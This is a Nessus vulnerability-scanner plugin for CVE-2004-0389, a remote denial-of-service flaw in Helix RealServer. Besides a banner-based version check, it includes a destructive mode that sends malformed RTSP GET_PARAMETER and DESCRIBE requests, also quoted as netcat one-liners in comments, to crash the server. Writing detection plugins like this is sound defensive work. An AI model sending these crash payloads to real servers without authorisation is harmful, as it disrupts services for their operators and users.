#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(12210);
 script_version("$Revision: 1.11 $");
 script_cvs_date("$Date: 2011/09/12 01:34:03 $");

 script_cve_id("CVE-2004-0389");
 script_bugtraq_id(10157);
 script_osvdb_id(5399);
 
 script_name(english:"Helix RealServer HTTP GET Request DoS");
 script_summary(english:"RealServer and Helix Server remote DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a media delivery application that is
affected by a remote denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of RealServer that is vulnerable
to a remote Denial of Service attack/ The issue is caused when a
malformed GET_PARAMETER or DESCRIBE request is sent to the server.");
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c941852d");
 script_set_attribute(attribute:"solution", value:
"Upgrade to RealServer 9.0.3 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value:"2004/04/15");
 script_set_attribute(attribute:"vuln_publication_date", value:"2004/04/16");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2011 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");

 script_dependencie("find_service2.nasl");
 script_require_ports("Services/rtsp", 554);
 exit(0);
}


# start script

port = get_kb_item("Services/rtsp");
if(!port)port = 554;

if (safe_checks()) {
     if (get_port_state(port)) {
         soc = open_sock_tcp(port);
         if (soc) {
             data = string("OPTIONS * RTSP/1.0\r\n\r\n");
             send(socket:soc, data:data);
             header = recv(socket:soc, length:1024);
             if(("RTSP/1" >< header) && ("Server:" >< header)) {
                 server = egrep(pattern:"Server:",string:header);
                 if( (egrep(pattern:"Version [0-8]\.[0-9]", string:server)) ||
                       (egrep(pattern:"Version 9\.0\.[0-2]", string:server)) ) {
                            security_hole(port);
                 }
            }
        close(soc);
        }
     }
} else {
    # per idefense advisory
    # $ echo -e "GET_PARAMETER / RTSP/1.0\n\n" | nc -v localhost 554
    # $ echo -e "DESCRIBE / RTSP/1.0\nSession:\n\n" | nc -v localhost 554
    req[0] = string("GET_PARAMETER / RTSP/1.0\n\n");
    req[1] = string("DESCRIBE / RTSP/1.0\nSession:\n\n");
    req[2] = string("GET / RTSP/1.0\n\n");
    for (i=0; req[i]; i++) {
        soc = open_sock_tcp(port);
        if (!soc) {
            if (i > 0) security_hole(port);
            exit(0);
        }
        send(socket:soc, data:req[i]);
        close(soc);
    }
}
    



